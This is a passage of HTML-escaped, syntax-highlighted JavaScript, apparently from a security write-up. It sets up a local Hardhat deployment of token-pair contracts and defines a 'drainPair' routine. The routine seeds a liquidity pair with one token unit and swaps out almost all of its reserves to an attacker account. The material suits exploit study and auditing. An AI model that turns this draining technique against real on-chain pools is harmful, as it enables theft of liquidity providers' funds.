class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eINITIAL_TOKEN_SUPPLY_FOR_ATTACKER\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eINITIAL_TOKEN_SUPPLY_FOR_ATTACKER\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy PairGenerator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGeneratorFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;PairGenerator\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGeneratorFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy PairFactory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactoryFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;PairFactory\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactoryFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Initialize PairFactory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get Pair contract factory for later use\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Pair\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Modified drainPair to use current balances from the pair\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoLowerCase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoLowerCase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get current balances from the pair contract right before draining\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT0InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT1InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker sends 1 of token0 to the pair to facilitate the first swap\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT0InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT0InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eadd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Update local tracking\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker swaps out (current balance of token1 - 1) from the pair\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Ensure we don\u0026#39;t try to swap more than available or zero if balance is already 1 or less\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountT1ToSwapOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT1InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) ? \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT1InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esub\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) : \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBigNumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountT1ToSwapOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e             \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountT1ToSwapOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;0x\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Get actual balance of t0 after the first swap (it might have changed due to swap mechanics if _k was not 0)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT0InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get actual balance of t1 after the first swap\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT1InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker sends 1 of token1 to the pair to facilitate the second swap\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003et1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan 